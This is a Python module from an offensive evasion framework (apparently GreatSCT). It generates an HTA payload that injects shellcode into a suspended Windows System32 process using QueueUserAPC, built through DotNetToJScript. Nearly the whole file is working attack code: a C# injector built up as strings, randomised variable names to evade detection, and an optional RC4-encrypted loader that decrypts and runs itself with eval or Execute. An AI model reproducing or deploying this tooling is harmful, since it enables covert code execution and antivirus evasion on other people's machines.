"""

MSHTA DotNetToJScript Shellcode injection with process migration via a suspended process and QueueUserAPC
Uses basic variable renaming obfuscation.

Adapated from code from:
    https://github.com/ConsciousHacker/Shellcode-Via-HTA/blob/master/BeaconMigrate.cs
    https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/payloads/cs/shellcode_inject/base64.py

Module built by @ConsciousHacker

"""

import base64
import os
from Tools.Bypass.bypass_common import bypass_helpers # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import gamemaker # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import shellcode_help # pylint: disable=E0611,E0401
from Tools.Bypass.bypass_common import encryption # pylint: disable=E0611,E0401

class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "mshta"
        self.extension = "hta"
        self.rating = "Excellent"
        self.description = "MSHTA DotNetToJScript Shellcode Injection with Process Migration"
        self.name = "MSHTA Shellcode Injection with Process Migration"
        self.path = "mshta/shellcode_inject/base64_migrate"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "PROCESS"   :  ["userinit.exe", "Any process from System32/SysWOW64"],
            "SCRIPT_TYPE" : ["JScript", "JScript or VBScript"],
            "ENCRYPTION" : ["X", "Encrypt the payload with RC4"]
        }

    def generate(self):
        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = "0" + ",0".join(Shellcode.split("\\")[1:])
        Shellcode = base64.b64encode(
            bytes(Shellcode, 'latin-1')).decode('ascii')
        
        # randomize all our variables, yo
        x86 = bypass_helpers.randomString()
        # generate a random key
        key = bypass_helpers.randomString().lower()

        # figure out a sane way to generate two separate instances of shellcode within the framework
        # currently, only 32 bit payload shellcode will work
        
        payload_code, num_tabs_required = gamemaker.senecas_games(self)
        code = ""
        num_tabs = 0

        bytearrayName = bypass_helpers.randomString()
        className = "HelloWorld"
        processMigrate = "Print"
        processMigratex86 = bypass_helpers.randomString()
        processMigrateProcessPath = bypass_helpers.randomString()
        processMigrateShellcode = bypass_helpers.randomString()
        shellCode = bypass_helpers.randomString()
        startupInfo = bypass_helpers.randomString()
        processInformation = bypass_helpers.randomString()
        success = bypass_helpers.randomString()
        resultPtr = bypass_helpers.randomString()
        bytesWritten = bypass_helpers.randomString()
        resultBool = bypass_helpers.randomString()
        oldProtect = bypass_helpers.randomString()
        targetProc = bypass_helpers.randomString()
        currentThreads = bypass_helpers.randomString()
        sht = bypass_helpers.randomString()
        ptr = bypass_helpers.randomString()
        ThreadHandle = bypass_helpers.randomString()

        code += "using System;\nusing System.Diagnostics;\nusing System.Reflection;\nusing System.Runtime.InteropServices;\nusing System.Linq;\n\n"
        code += "[ComVisible(true)]\n"
        code += "public class {0}\n".format(className)
        code += "{\n"

        num_tabs += 1

        code += "\t" * num_tabs + "public {0}()\n".format(className)
        code += "\t" * num_tabs + "{\n\n"
        code += "\t" * num_tabs + "}\n\n"
        code += "\t" * num_tabs + "public void {0}(string {1})\n".format(processMigrate, processMigratex86)
        code += "\t" * num_tabs + "{\n"
        code += "\t" * num_tabs + payload_code
        code += "\t" * num_tabs + "string {0};\n".format(processMigrateShellcode)
        code += "\t" * num_tabs + "string {0};\n".format(processMigrateProcessPath)
        code += "\t" * num_tabs + "\t{0} = {1};\n".format(processMigrateShellcode, processMigratex86)
        code += "\t" * num_tabs + "\t{0} = \"{1}\";\n\n".format(processMigrateProcessPath, "C:\\\\Windows\\\\System32\\\\" + self.required_options["PROCESS"][0])
        code += '\t' * num_tabs + "\tstring %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(%s));\n" % (bytearrayName, processMigrateShellcode)
        code += '\t' * num_tabs + "\tstring[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
        code += '\t' * num_tabs + "\tbyte[] %s = new byte[chars.Length];\n" %(shellCode)
        code += '\t' * num_tabs + \
                    "\tfor (int i = 0; i < chars.Length; ++i) { %s[i] = Convert.ToByte(chars[i], 16); }\n" % (
                        shellCode)
        code += "\t" * num_tabs + "\tSTARTUPINFO {0} = new STARTUPINFO();\n".format(startupInfo)
        code += "\t" * num_tabs + "\tPROCESS_INFORMATION {0} = new PROCESS_INFORMATION();\n".format(processInformation)
        code += "\t" * num_tabs + "\tbool {0} = CreateProcess({1}, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW , IntPtr.Zero, null, ref {2}, out {3});\n".format(success, processMigrateProcessPath, startupInfo, processInformation)
        code += "\t" * num_tabs + "\tIntPtr {0} = VirtualAllocEx({1}.hProcess, IntPtr.Zero, {2}.Length, MEM_COMMIT, PAGE_READWRITE);\n".format(resultPtr, processInformation, shellCode)
        code += "\t" * num_tabs + "\tIntPtr {0} = IntPtr.Zero;\n".format(bytesWritten)
        code += "\t" * num_tabs + "\tbool {0} = WriteProcessMemory({1}.hProcess,{2},{3},{4}.Length, out {5});\n".format(resultBool, processInformation, resultPtr, shellCode, shellCode, bytesWritten)
        code += "\t" * num_tabs + "\tuint {0} = 0;\n".format(oldProtect)
        code += "\t" * num_tabs + "\t{0} = VirtualProtectEx({1}.hProcess, {2}, {3}.Length, PAGE_EXECUTE_READ, out {4} );\n".format(resultBool, processInformation, resultPtr, shellCode, oldProtect)
        code += "\t" * num_tabs + "\tProcess {0} = Process.GetProcessById((int){1}.dwProcessId);\n".format(targetProc, processInformation)
        code += "\t" * num_tabs + "\tProcessThreadCollection {0} = {1}.Threads;\n".format(currentThreads, targetProc)
        code += "\t" * num_tabs + "\tIntPtr {0} = OpenThread(ThreadAccess.SET_CONTEXT, false, {1}[0].Id);\n".format(sht, currentThreads)
        code += "\t" * num_tabs + "\tIntPtr {0} = QueueUserAPC({1},{2},IntPtr.Zero);\n".format(ptr, resultPtr, sht)
        code += "\t" * num_tabs + "\tIntPtr {0} = {1}.hThread;\n".format(ThreadHandle, processInformation)
        code += "\t" * num_tabs + "\tResumeThread({0});\n".format(ThreadHandle)
        code += "\t" * num_tabs + "}\n"
        code += """
            private static UInt32 MEM_COMMIT = 0x1000;
            private static UInt32 PAGE_EXECUTE_READ = 0x20;
            private static UInt32 PAGE_READWRITE = 0x04;

            [Flags]
            public enum ProcessAccessFlags : uint
            {
                All = 0x001F0FFF,
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VirtualMemoryOperation = 0x00000008,
                VirtualMemoryRead = 0x00000010,
                VirtualMemoryWrite = 0x00000020,
                DuplicateHandle = 0x00000040,
                CreateProcess = 0x000000080,
                SetQuota = 0x00000100,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                QueryLimitedInformation = 0x00001000,
                Synchronize = 0x00100000
            }
            
            [Flags]
            public enum ProcessCreationFlags : uint
            {
                ZERO_FLAG = 0x00000000,
                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                CREATE_NEW_CONSOLE = 0x00000010,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_NO_WINDOW = 0x08000000,
                CREATE_PROTECTED_PROCESS = 0x00040000,
                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                CREATE_SEPARATE_WOW_VDM = 0x00001000,
                CREATE_SHARED_WOW_VDM = 0x00001000,
                CREATE_SUSPENDED = 0x00000004,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                DEBUG_PROCESS = 0x00000001,
                DETACHED_PROCESS = 0x00000008,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                INHERIT_PARENT_AFFINITY = 0x00010000
            }

            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public uint dwProcessId;
                public uint dwThreadId;
            }

            public struct STARTUPINFO
            {
                public uint cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public uint dwX;
                public uint dwY;
                public uint dwXSize;
                public uint dwYSize;
                public uint dwXCountChars;
                public uint dwYCountChars;
                public uint dwFillAttribute;
                public uint dwFlags;
                public short wShowWindow;
                public short cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }
            
            [Flags]
            public enum ThreadAccess : int
            {
                TERMINATE           = (0x0001)  ,
                SUSPEND_RESUME      = (0x0002)  ,
                GET_CONTEXT         = (0x0008)  ,
                SET_CONTEXT         = (0x0010)  ,
                SET_INFORMATION     = (0x0020)  ,
                QUERY_INFORMATION       = (0x0040)  ,
                SET_THREAD_TOKEN    = (0x0080)  ,
                IMPERSONATE         = (0x0100)  ,
                DIRECT_IMPERSONATION    = (0x0200)
            }
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
                int dwThreadId);

            
            [DllImport("kernel32.dll",SetLastError = true)]
            public static extern bool WriteProcessMemory(
                IntPtr hProcess,
                IntPtr lpBaseAddress,
                byte[] lpBuffer,
                int nSize,
                out IntPtr lpNumberOfBytesWritten);
            
            [DllImport("kernel32.dll")]
            public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
            
            [DllImport("kernel32.dll", SetLastError = true )]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

            [DllImport("kernel32.dll")]
            static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect, out uint lpflOldProtect);
            
            [DllImport("kernel32.dll")]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
                                    bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
                                    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll")]
            public static extern uint ResumeThread(IntPtr hThread);

            [DllImport("kernel32.dll")]
            public static extern uint SuspendThread(IntPtr hThread);
            }
            """

        with open("/tmp/hta_source.cs", "w") as f:
            f.write(code)

        if self.required_options["SCRIPT_TYPE"][0].lower() == "jscript":


            with open("/tmp/migrate.js", "w") as ff:
                ff.write("o.Print({0});".format(x86)
                        )
            os.system(
                "mcs -platform:x86 -target:library -sdk:2 {0} -out:/tmp/dotnettojscript.dll".format("/tmp/hta_source.cs"))
            os.system("WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll -ver auto -c HelloWorld -o {0} -s /tmp/migrate.js".format("/tmp/greatsct.js"))
            with open("/tmp/greatsct.js", 'r') as original:
                data = original.read()
            
            with open("/tmp/greatsct.js", 'w') as modified:
                modified.write("<script language=\"JScript\">\n\nvar {0} = \"{1}\";\n\n".format(
                    x86, Shellcode) + data + "\nwindow.close();\n</script>")
            
            with open("/tmp/greatsct.js", "r") as js:
                payload = js.read()
        
            if self.required_options["ENCRYPTION"][0].lower() != "x":
                

                encrypted_payload = encryption.rc4(key, payload)
                encrypted_payload = base64.standard_b64encode(bytes(encrypted_payload, "latin-1")).decode("ascii")

                # rc4 = bypass_helpers.randomString()
                # jskey = bypass_helpers.randomString()
                # string = bypass_helpers.randomString()
                # s = bypass_helpers.randomString()
                # j = bypass_helpers.randomString()
                # x = bypass_helpers.randomString()
                # TODO obfuscate
                source_code = "<script language = \"javascript\">"
                # Based on code from https://github.com/mdsecactivebreach/SharpShooter
                source_code += """rc4 = function(key, str) {
                var s = [], j = 0, x, res = '';
                for (var i = 0; i < 256; i++) {
                    s[i] = i;
                }
                for (i = 0; i < 256; i++) {
                    j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
                    x = s[i];
                    s[i] = s[j];
                    s[j] = x;
                }
                i = 0;
                j = 0;
                for (var y = 0; y < str.length; y++) {
                    i = (i + 1) % 256;
                    j = (j + s[i]) % 256;
                    x = s[i];
                    s[i] = s[j];
                    s[j] = x;
                    res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
                }
                return res;
            }

            decodeBase64 = function(s) {
                var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
                var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for(i=0;i<64;i++){e[A.charAt(i)]=i;}
                for(x=0;x<L;x++){
                    c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
                    while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
                }
                return r;
            };"""

                source_code += '\nvar b64block = "{0}";'.format(encrypted_payload)
                source_code += "\nvar decoded = decodeBase64(b64block);"
                source_code += "\nvar plain = rc4(\"{0}\", decoded);".format(key)
                source_code += "\neval(plain);"
                source_code += "\n</script>"
            
            else:
                source_code = payload

        elif self.required_options["SCRIPT_TYPE"][0].lower() == "vbscript":
            # do stuff

            with open("/tmp/migrate.vbs", "w") as ff:
                ff.write("o.Print {0}".format(x86)
                         )
            os.system(
                "mcs -platform:x86 -target:library -sdk:2 {0} -out:/tmp/dotnettojscript.dll".format("/tmp/hta_source.cs"))
            os.system(
                "WINEPREFIX=/root/.greatsct wine /usr/share/greatsct/DotNetToJScript.exe /tmp/dotnettojscript.dll -ver auto -l vbscript -c HelloWorld -o {0} -s /tmp/migrate.vbs".format("/tmp/greatsct.vbs"))

            with open("/tmp/greatsct.vbs", 'r') as original:
                data = original.read()

            with open("/tmp/greatsct.vbs", 'w') as modified:
                modified.write("<script language=\"VBScript\">\n\n\nDim {0} : {0} = \"{1}\"\n\n".format(
                    x86, Shellcode) + data + "\nSelf.Close()\n</script>")

            with open("/tmp/greatsct.vbs", "r") as vbs:
                payload = vbs.read()

            if self.required_options["ENCRYPTION"][0].lower() != "x":

                encrypted_payload = encryption.rc4(key, payload)
                encrypted_payload = base64.standard_b64encode(bytes(encrypted_payload, "latin-1")).decode("ascii")

                # Based on code from https://github.com/mdsecactivebreach/SharpShooter
                # TODO: obfuscate
                source_code = ""

                source_code += """rc4 = function(key, str) {
                var s = [], j = 0, x, res = '';
                for (var i = 0; i < 256; i++) {
                    s[i] = i;
                }
                for (i = 0; i < 256; i++) {
                    j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
                    x = s[i];
                    s[i] = s[j];
                    s[j] = x;
                }
                i = 0;
                j = 0;
                for (var y = 0; y < str.length; y++) {
                    i = (i + 1) % 256;
                    j = (j + s[i]) % 256;
                    x = s[i];
                    s[i] = s[j];
                    s[j] = x;
                    res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
                }
                return res;
            }

            decodeBase64 = function(s) {
                var e={},i,b=0,c,x,l=0,a,r='',w=String.fromCharCode,L=s.length;
                var A="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                for(i=0;i<64;i++){e[A.charAt(i)]=i;}
                for(x=0;x<L;x++){
                    c=e[s.charAt(x)];b=(b<<6)+c;l+=6;
                    while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(r+=w(a));}
                }
                return r;
            };"""

                source_code += '\nvar b64block = "{0}";'.format(encrypted_payload)
                source_code += "\nvar decoded = decodeBase64(b64block);"
                source_code += "\nvar plain = rc4(\"{0}\", decoded);".format(key)
                source_code += "\n</script>"
                source_code += "\n<script language = \"vbscript\">"
                source_code += "\nExecute plain"
                source_code += "\nself.close"
                source_code += "</script>"
                source_code = "<script language = \"javascript\">\n" + source_code
            else:
                source_code = payload
        else:
            print("Script type not supported")

        self.payload_source_code = source_code
        return
